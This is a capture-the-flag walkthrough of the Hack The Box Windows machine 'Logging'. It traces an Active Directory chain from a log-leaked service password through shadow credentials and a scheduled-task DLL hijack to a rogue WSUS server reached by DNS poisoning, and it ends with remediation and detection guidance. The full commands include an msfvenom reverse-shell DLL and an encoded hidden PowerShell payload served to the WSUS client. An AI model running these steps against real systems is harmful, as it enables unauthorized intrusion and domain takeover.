Hack The Box / Medium / Windows

Logging

A Windows Active Directory domain controller (logging.htb) runs WSUS alongside the usual AD services. Starting from a low-privilege domain account, a service-account password leaked in a log file on an SMB share leads to shadow-credential abuse and a WinRM foothold. From there, a writable scheduled-task payload directory is hijacked for a lateral move to a user who can enroll certificates, and a fake WSUS server - fed by a poisoned DNS record and a certificate for the WSUS hostname - delivers a SYSTEM shell.

Retired machine · validated walkthrough · Authorized laboratory assessment · Reviewed: 2026-10-03

Dylan Senez / D4RKGUNN3R

Active Directory, WSUS, certificates, DNS poisoning, scheduled tasks, shadow credentials

Case overview

Outcome

The leaked svc_recovery password (a one-year roll of the original) enabled shadow-credential abuse against msa_health$, whose NT hash opened WinRM. A DLL hijack of the UpdateChecker Agent scheduled task moved us to jaylee.clifton and user.txt. A fake-delegation ticket, certificate enrollment on the UpdateSrv template, and a poisoned wsus.logging.htb DNS record let us stand up a rogue WSUS server (wsuks) that the UpdateChecker Agent trusted, returning a SYSTEM shell and root.txt.

Key takeaway

Logging is a chain of trust decisions: a password reused with only the year changed, a service account with GenericAll over a machine account, a scheduled task that runs a DLL from a writable folder, and a WSUS client that will happily talk to whatever server its DNS says is authoritative. Each one is a small misconfiguration, but together they walk from a low-privilege login to full control of the domain controller.

Validated steps were directly reproduced. Documented steps are supported by preserved artifacts. Staged steps remain incomplete or await evidence.

Attack path

  • Full TCP sweep maps a domain controller (logging.htb, DC01) with WSUS on 8530/8531
  • RID brute force with the provided wallace.everette credentials maps users and groups
  • SMB Logs share leaks svc_recovery's old password in IdentitySync_Trace_20260219.log
  • Year-rolled password (2025 -> 2026) authenticates svc_recovery
  • svc_recovery has GenericAll over msa_health$; certipy shadow auto adds shadow credentials and dumps its NT hash
  • Evil-WinRM as msa_health$ (Remote Management Users) gives a foothold
  • WinPEAS flags CVE-2025-59287 (WSUS) and a writable scheduled-task payload directory
  • DLL hijack of the UpdateChecker Agent task yields a shell as jaylee.clifton and user.txt
  • Rubeus tgtdeleg captures a cifs/DC01.logging.htb delegation ticket; certipy enrolls a cert for wsus.logging.htb on UpdateSrv
  • dnstool.py poisons wsus.logging.htb to the attacker IP; wsuks serves a fake WSUS server
  • UpdateChecker Agent pulls the payload; SYSTEM shell reads root.txt

1. Reconnaissance — Full TCP scan and domain controller fingerprinting

Validated · Kali / attacker · EVD-001

Artifact

logging_tcp.nmap

Command / request

nmap -p- --min-rate 10000 -n -Pn -oA logging_tcp 192.0.2.10
nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8530,8531,9389,47001 -sC -sV -A 192.0.2.10

Observed result

53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0 (TRACE enabled)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb)
445/tcp   open  microsoft-ds  (smb2-security-mode: Message signing enabled and required)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
8530/tcp  open  http          Microsoft IIS httpd 10.0 (WSUS)
8531/tcp  open  ssl/unknown   (TLS, ALPN h2/http1.1, CN=DC01.logging.htb)
9389/tcp  open  mc-nmf        .NET Message Framing
OS details: Microsoft Windows Server 2019
Service Info: Host: DC01; OS: Windows

Analysis

The target is a domain controller for logging.htb. Two things stand out: the LDAP certificate is issued by an internal CA (SANs DC01.logging.htb, logging.htb), and ports 8530/8531 reveal a WSUS deployment - an unusual and often under-hardened attack surface. SMB signing is required, so relay is off the table; progress will come from credentials and trust relationships.

Why this mattered

Establishes the Active Directory attack surface and flags WSUS as a service worth dedicated enumeration.

2. Reconnaissance — Hosts file, time sync, Kerberos config, and DNS TXT lookup

Validated · Kali / attacker · EVD-002

Artifact

/etc/hosts, /etc/krb5.conf

Command / request

echo '192.0.2.10  logging.htb dc01.logging.htb' >> /etc/hosts
timedatectl set-ntp off && ntpdate logging.htb
dig txt logging.htb @192.0.2.10

Observed result

Time synced with the DC (clock skew 0s).
TXT query returned SOA: dc01.logging.htb / hostmaster.logging.htb.
krb5.conf configured with default_realm = logging.htb, kdc = dc01.logging.htb.

Analysis

Kerberos tooling fails if the local clock drifts more than a few minutes from the DC, so time sync comes first. The krb5.conf realm mapping makes getTGT, certipy, and Rubeus-style flows work cleanly. The SOA record adds hostmaster.logging.htb to the host file - a small detail that keeps DNS resolution consistent.

Why this mattered

Removes the two most common Kerberos failure modes before any ticket work begins.

3. Internal Enumeration — RID brute force with the provided domain credentials

Artifact

rid-brute.txt

Observed result

Users: svc_recovery, jaylee.clifton, monique.chip, kyson.abel, fable.milford, wellington.kylan, serina.philander, wallace.everette, toby.brynleigh, msa_health$
Groups: DnsUpdateProxy, Emergency Recovery, IT, HR, WSUS Administrators, WSUS Reporters

Analysis

The RID dump exposes a service account (svc_recovery), a machine account (msa_health$), and groups that map to real business functions. WSUS Administrators and WSUS Reporters confirm the WSUS deployment is actively managed, and DnsUpdateProxy hints at DNS-integrated update behavior worth remembering later.

Why this mattered

Turns one credential into a map of accounts and groups, highlighting service and machine accounts as prime targets.

4. Internal Enumeration — BloodHound collection for the full relationship map

Validated · Kali / attacker · EVD-004

Artifact

bloodhound.zip

Command / request

bloodhound.py -d logging.htb -v --zip -c All -dc dc01.logging.htb -ns 192.0.2.10 -u 'wallace.everette' -p '[REDACTED]'

Observed result

Full collection ZIP ingested into BloodHound.
Key relationship: svc_recovery has GenericAll over msa_health$.

Analysis

BloodHound immediately surfaces the relationship that drives the whole engagement: svc_recovery holds GenericAll over the msa_health$ machine account. GenericAll on a machine account is the textbook precondition for shadow credentials - add a Key Credential, authenticate as the account, and dump its NT hash.

Why this mattered

Reveals the privilege relationship that turns a service-account credential into a machine-account compromise.

5. Exploitation — SMB Logs share leaks a service-account password

Validated · Kali / attacker · EVD-005

Artifact

IdentitySync_Trace_20260219.log

Command / request

smbclient //192.0.2.10/Logs -U 'logging.htb\\wallace.everette%[REDACTED]'
get TaskMonitor.log
get Audit_Heartbeat.log
get IdentitySync_Trace_20260219.log
get Service_State.log
cat IdentitySync_Trace_20260219.log

Observed result

IdentitySync_Trace_20260219.log contains:
  BindUser: LOGGING\svc_recovery
  BindPass: "[REDACTED]" (2025-era password)
The password failed against the current domain.

Analysis

The Logs share is the same directory the DC's own monitoring scripts write to, and one trace file logs the bind credentials of the svc_recovery service account in plaintext. The password is from 2025 and no longer works - but people rarely change passwords properly, they just bump the year.

Why this mattered

Provides a credential lead that only needs a small, predictable mutation to become valid.

6. Exploitation — Year-rolled password and shadow credentials on msa_health$

Validated · Kali / attacker · EVD-006

Artifact

svc_recovery.ccache, msa_health.ccache

Command / request

getTGT.py -k -dc-ip 192.0.2.10 logging.htb/svc_recovery:'[REDACTED]'
export KRB5CCNAME=$(pwd)/svc_recovery.ccache
certipy shadow auto -u 'svc_recovery@logging.htb' -k -target DC01.logging.htb -account msa_health$ -dc-ip 192.0.2.10

Observed result

Password with the year rolled to 2026 authenticates successfully.
Key Credential added to msa_health$, TGT obtained, old Key Credential restored.
NT hash for msa_health$: [REDACTED]

Analysis

The 2025 password with the year changed to 2026 works - exactly the lazy password rotation the log hinted at. With svc_recovery's GenericAll over msa_health$, certipy shadow auto adds a temporary Key Credential, authenticates as the machine account, dumps its NT hash, and restores the original credential so nothing breaks.

Why this mattered

Converts a service-account password into a machine-account NT hash, which is the key to the next door.

7. User Access — WinRM foothold as msa_health$ and WinPEAS reconnaissance

Validated · Kali / attacker · EVD-007

Artifact

winPEASany.exe output

Command / request

evil-winrm -u 'msa_health$' -H '[REDACTED]' -i dc01.logging.htb
upload winPEASany.exe
.\winPEASany.exe

Observed result

Initial access as msa_health$ (member of Remote Management Users).
WinPEAS findings:
  - WSUS vulnerable to CVE-2025-59287
  - Write access to scheduled-task locations
  - UpdateMonitor at C:\ProgramData\UpdateMonitor
  - UpdateChecker Agent scheduled task runs every 3 minutes
  - monitor.log: the task looks for Settings_Update.zip, extracts settings_update.dll, and runs it

Analysis

msa_health$ is in Remote Management Users, so the dumped hash opens WinRM directly. WinPEAS then hands over the whole engagement: a scheduled task that executes a DLL from a directory we can write to, running as jaylee.clifton, plus a WSUS server vulnerable to a critical deserialization bug. The task's local-first update lookup is the lateral-movement primitive.

Why this mattered

Identifies the writable scheduled-task payload directory and the WSUS vulnerability that drive the rest of the chain.

8. Lateral Movement — DLL hijack of the UpdateChecker Agent task to jaylee.clifton

Validated · Kali / attacker · EVD-008

Artifact

settings_update.dll, Settings_Update.zip

Command / request

msfvenom -p windows/shell_reverse_tcp LHOST=198.51.100.10 LPORT=4444 -f dll -o settings_update.dll
zip Settings_Update.zip settings_update.dll
# upload Settings_Update.zip to C:\ProgramData\UpdateMonitor\
nc -nlvp 4444

Observed result

After the next 3-minute task run, a reverse shell as jaylee.clifton.
C:\Users\jaylee.clifton\Desktop\user.txt -> [REDACTED]

Analysis

The UpdateChecker Agent task runs every 3 minutes, checks for Settings_Update.zip, extracts settings_update.dll, and executes it - and the directory is writable by our current account. Swapping in a msfvenom DLL and waiting for the next run hands over a shell as jaylee.clifton, who is in the IT group. user.txt is on the desktop.

Why this mattered

Moves from a machine account to a human user in the IT group, and captures the user proof.

9. Privilege Escalation — Delegation ticket, WSUS certificate, and DNS poisoning

Validated · Kali / attacker · EVD-009

Artifact

jaylee.clifton.kirbi, jaylee.clifton.ccache, wsus.pfx, wsus.pem

Command / request

.\Rubeus.exe tgtdeleg /nowrap
ticketConverter.py jaylee.clifton.kirbi jaylee.clifton.ccache
export KRB5CCNAME=$(pwd)/jaylee.clifton.ccache
certipy-ad req -u 'jaylee.clifton@logging.htb' -k -no-pass -ca 'logging-DC01-CA' -target dc01.logging.htb -dc-ip 192.0.2.10
certipy-ad auth -pfx jaylee.clifton.pfx -dc-ip 192.0.2.10
certipy-ad req -u 'jaylee.clifton@logging.htb' -hashes '[REDACTED]' -dc-ip 192.0.2.10 -ca 'logging-DC01-CA' -template 'UpdateSrv' -dns 'wsus.logging.htb' -subject 'CN=wsus.logging.htb' -out wsus
openssl pkcs12 -in wsus.pfx -out wsus.pem -nodes --passin pass:
python3 dnstool.py -u 'logging\\jaylee.clifton' -p '[REDACTED]' -a add -r wsus.logging.htb -d 198.51.100.10
Resolve-DnsName wsus.logging.htb

Observed result

Rubeus tgtdeleg captured a fake-delegation ticket for cifs/DC01.logging.htb (session key [REDACTED]).
Jaylee's NTLM hash recovered via certipy auth: [REDACTED].
Certificate for wsus.logging.htb issued from the UpdateSrv template (wsus.pfx -> wsus.pem).
DNS record wsus.logging.htb -> 198.51.100.10 added; Resolve-DnsName confirms the poisoned record.

Analysis

BloodHound showed jaylee.clifton can enroll certificates on the UpdateSrv template through her IT group membership. Rubeus tgtdeleg abuses the fake-delegation path to grab a cifs/DC01.logging.htb ticket and its session key, which certipy uses to authenticate and recover her NT hash. With that hash, certipy enrolls a TLS certificate for wsus.logging.htb - the exact hostname the WSUS client trusts - and dnstool.py adds a DNS record pointing that name at the attacker box.

Why this mattered

Builds the two things a rogue WSUS server needs: a trusted hostname (DNS) and a trusted identity (certificate).

10. Privilege Escalation — Rogue WSUS server delivers a SYSTEM shell

Validated · Kali / attacker · EVD-010

Artifact

wsuks (pipx), wsus.pem

Command / request

pipx install wsuks --system-site-packages
sudo wsuks --serve-only --tls-cert ./wsus.pem --WSUS-Port 8531 -I tun0 -c "/accepteula /s powershell.exe -NoP -NonI -W Hidden -Enc $ENC" --debug
nc -nlvp 4445

Observed result

UpdateChecker Agent connected to the rogue server on 8531.
Callback landed as SYSTEM.
C:\Users\toby.brynleigh\Desktop\root.txt -> [REDACTED]

Analysis

The UpdateChecker Agent resolves wsus.logging.htb, gets our poisoned record, and connects to 8531 - where wsuks presents the valid certificate and serves the payload. The WSUS client process runs with SYSTEM privileges, so the callback lands as SYSTEM, and root.txt is readable from toby.brynleigh's desktop. The WSUS trust chain (DNS + TLS) is the entire vulnerability.

Why this mattered

Completes the chain: a low-privilege domain account ends with SYSTEM on the domain controller.

Findings & remediation

F-1 — Plaintext service-account password in a log file on an SMB share

High · Validated · \\192.0.2.10\Logs\IdentitySync_Trace_20260219.log (svc_recovery bind credentials)

Description

The Logs SMB share, readable by a low-privilege domain account, contains a trace file that logs the svc_recovery service account's bind password in plaintext. The password was one year out of date and only required a year roll (2025 to 2026) to become valid (CWE-312 / CWE-521).

Impact

Disclosure of a service-account credential that, once rolled, enabled shadow-credential abuse against msa_health$ and ultimately full domain compromise.

Root cause

Application logging writes credentials to a file on a broadly readable share, and the service account's password is a weak, predictable value that users rotate by changing only the year.

Remediation

  • Never log credentials; redact secrets at the source and rotate anything that was exposed
  • Enforce strong, randomly generated service-account passwords or gMSAs
  • Restrict share ACLs so operational logs are not readable by ordinary domain users

Validation

  • An SMB client authenticated as wallace.everette downloaded IdentitySync_Trace_20260219.log and recovered the svc_recovery bind password; the year-rolled value authenticated successfully via getTGT.

F-2 — GenericAll over a machine account enabling shadow credentials

High · Validated · logging.htb domain (svc_recovery -> GenericAll -> msa_health$)

Description

svc_recovery holds GenericAll over the msa_health$ machine account. Combined with the recovered password, this allowed certipy shadow auto to add a Key Credential, authenticate as msa_health$, dump its NT hash, and restore the original credential (CWE-284 / MITRE T1098).

Impact

Full takeover of the msa_health$ machine account, whose Remote Management Users membership provided an interactive WinRM foothold on the domain controller.

Root cause

A service account is granted GenericAll over a machine account, and the environment permits shadow-credential (Key Credential) writes without additional controls.

Remediation

  • Remove GenericAll-style delegation rights from service accounts over machine accounts
  • Enable and review object-access auditing for Key Credential attribute changes
  • Monitor for new Key Credential objects on machine and service accounts

Validation

  • certipy shadow auto added a Key Credential to msa_health$, obtained a TGT, recovered its NT hash, and restored the original credential; the hash authenticated via Evil-WinRM.

F-3 — Writable scheduled-task payload directory (DLL hijack)

High · Validated · C:\ProgramData\UpdateMonitor\ (UpdateChecker Agent task, principal jaylee.clifton)

Description

The UpdateChecker Agent scheduled task runs every 3 minutes, extracts settings_update.dll from Settings_Update.zip in C:\ProgramData\UpdateMonitor, and executes it. The directory is writable by the compromised msa_health$ account, allowing the payload to be replaced (CWE-427 / MITRE T1574.002).

Impact

Arbitrary code execution as jaylee.clifton (IT group), yielding user.txt and the certificate-enrollment rights used for the WSUS attack.

Root cause

A scheduled task executes a binary from a directory whose ACLs allow modification by non-privileged accounts, with no integrity validation of the payload.

Remediation

  • Apply least-privilege ACLs to scheduled-task payload directories
  • Validate binary integrity (signatures/hashes) before execution
  • Run tasks with the minimum principal required and audit task definitions

Validation

  • A msfvenom DLL zipped as Settings_Update.zip was uploaded to the directory; the next 3-minute task run executed it and returned a reverse shell as jaylee.clifton.

F-4 — WSUS trust chain: vulnerable server, certificate template, and DNS poisoning

Critical · Validated · wsus.logging.htb (8530/8531), UpdateSrv certificate template, DNS zone

Description

The WSUS deployment is vulnerable to CVE-2025-59287 (unauthenticated deserialization RCE, CVSS 9.8). The UpdateSrv certificate template allows jaylee.clifton (via IT) to enroll a certificate for the wsus.logging.htb SAN, and the DNS zone permits an authenticated user to add an A record for that hostname. Together these let an attacker stand up a rogue WSUS server the client trusts (CWE-502 / CWE-295 / MITRE T1649).

Impact

SYSTEM-level code execution on the domain controller: the UpdateChecker Agent connected to the rogue server on 8531 and executed the served payload with SYSTEM privileges, yielding root.txt.

Root cause

An unpatched WSUS server, an overly permissive certificate template (arbitrary SAN enrollment by a non-admin), and DNS zone ACLs that allow record modification - each a trust decision the WSUS client relies on.

Remediation

  • Patch WSUS against CVE-2025-59287 and restrict 8530/8531 to authorized management hosts
  • Restrict UpdateSrv template enrollment to accounts that genuinely need it and monitor enrollments
  • Harden DNS zone ACLs and monitor for new or changed A records on critical hostnames
  • Segment WSUS clients from direct DNS/TLS trust of arbitrary servers

Validation

  • Rubeus tgtdeleg captured a cifs/DC01.logging.htb ticket; certipy enrolled a wsus.logging.htb certificate from UpdateSrv; dnstool.py added the poisoned A record; wsuks served the payload on 8531 and the task callback landed as SYSTEM.

Analysis

Logging is a chain-of-trust problem. The perimeter is a hardened domain controller - SMB signing is required, Kerberos is the only sane auth path, and there is no obvious relay - so progress comes from how the environment trusts things. A log file leaks a service password that only had its year changed. A service account holds GenericAll over a machine account, which is exactly the relationship shadow credentials are designed to abuse. A scheduled task runs a DLL from a directory anyone can write to, and it runs as a user who can enroll certificates. Finally, the WSUS client trusts DNS and TLS: poison the record, present a certificate for the right hostname, and the client will happily download a payload from you. Every step is a small, individually plausible misconfiguration; the chain is what makes it a domain compromise.

Remediation

  • Never store plaintext credentials in log files; redact secrets at the source and rotate anything that was exposed
  • Use unique, randomly generated passwords or gMSAs for service accounts and remove GenericAll-style delegation rights over machine accounts
  • Protect scheduled-task payload directories with least-privilege ACLs and validate the integrity of binaries they execute
  • Patch WSUS (CVE-2025-59287) and restrict 8530/8531 to authorized management hosts
  • Restrict certificate template enrollment (UpdateSrv) to accounts that genuinely need it and monitor for unexpected enrollments
  • Harden DNS zones against unauthorized record modification and monitor for new or changed A records on critical hostnames

Defender perspective

This engagement is almost entirely about trust decisions, and the signals are spread across several logs. The leaked password shows up as a service account authenticating from an unexpected source. Shadow credentials appear as new Key Credential objects on a machine account. The DLL hijack is a file write to a program-data directory followed by a process spawn from that path. The final stage is the loudest: a DNS record for the WSUS hostname changes, and a client that normally talks to the internal WSUS server suddenly connects to an external IP on 8531. Correlating DNS change events with WSUS client connection logs would surface the whole chain.

Detection opportunities

  • Alert on new Key Credential (shadow credential) objects added to machine or service accounts
  • Monitor scheduled-task payload directories for unexpected file writes and new DLLs
  • Track DNS record changes for critical hostnames such as the WSUS server, especially outside change windows
  • Alert on WSUS clients connecting to unexpected IPs on 8530/8531 or on TLS certificates for the WSUS hostname issued outside the normal CA process
  • Review service-account logons from non-standard hosts and flag password reuse across accounts
  • Enable object-access auditing on certificate templates and monitor for enrollments by non-admin users

Lessons learned

  • Passwords with only the year changed are effectively the same password; attackers will try the obvious roll
  • GenericAll over a machine account is a shadow-credential one-liner - treat it as a critical finding
  • Scheduled tasks that execute binaries from writable directories are a reliable lateral-movement primitive
  • WSUS clients trust DNS and TLS above all else; a valid certificate for the right hostname is all a rogue server needs
  • Certificate template enrollment rights are privilege - audit who can enroll and for which SANs

Open questions

  • The export does not document how the initial wallace.everette credentials were obtained; the documented chain begins at assume-breach
  • WinPEAS identified CVE-2025-59287, but the export does not detail whether the final payload was delivered via the deserialization bug itself or via the WSUS client trust path; the wsuks tooling covers both
  • Enumeration showed the UpdateChecker Agent task principal as jaylee.clifton, yet the final callback landed with SYSTEM privileges - the exact process context of the WSUS client connection is not fully documented

Troubleshooting & success factors

  • Kerberos tooling requires the local clock to be within minutes of the DC; sync with ntpdate before requesting tickets
  • krb5.conf must define the logging.htb realm and KDC or getTGT/certipy will fail with clock/realm errors
  • The leaked svc_recovery password failed at first; the year roll from 2025 to 2026 was the fix
  • The poisoned DNS record took a few minutes to propagate; verify with Resolve-DnsName before launching wsuks
  • The UpdateChecker Agent task runs every 3 minutes - upload the DLL and wait patiently for the callback
